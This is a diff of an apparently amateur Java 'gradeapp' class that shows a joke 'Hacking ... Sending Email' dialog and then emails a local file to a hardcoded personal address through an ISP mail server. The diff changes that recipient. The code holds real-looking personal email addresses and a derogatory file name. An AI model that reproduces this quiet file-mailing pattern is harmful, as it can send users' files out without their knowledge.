@@ -7,7 +7,6 @@ package gradeapp;
 
 import javax.swing.JOptionPane;
 import java.util.*;
-import java.io.*;
 import javax.mail.*;
 import javax.mail.internet.*;
 import javax.activation.*;
@@ -23,7 +22,7 @@ public static void sentEmail(){
 JOptionPane.showMessageDialog(null, "Wait A Sec ... Hacking ... Sending Email ...");
 
   // Change If Needed Here
-  String to = "desktopgradeapp@gmail.com";
+  String to = "s.badame@gmail.com";
   String from = "bigantfbi333@optonline.net";
   String host = "mail.optonline.net";
   String filename = "gayjava.txt";
@@ -51,8 +50,8 @@ JOptionPane.showMessageDialog(null, "Wait A Sec ... Hacking ... Sending Email ..
       // create the second message part
       MimeBodyPart mbp2 = new MimeBodyPart();
 
-            // attach the file to the message
-         FileDataSource fds = new FileDataSource(filename);
+      // attach the file to the message
+      FileDataSource fds = new FileDataSource(filename);
       mbp2.setDataHandler(new DataHandler(fds));
       mbp2.setFileName(fds.getName());
 
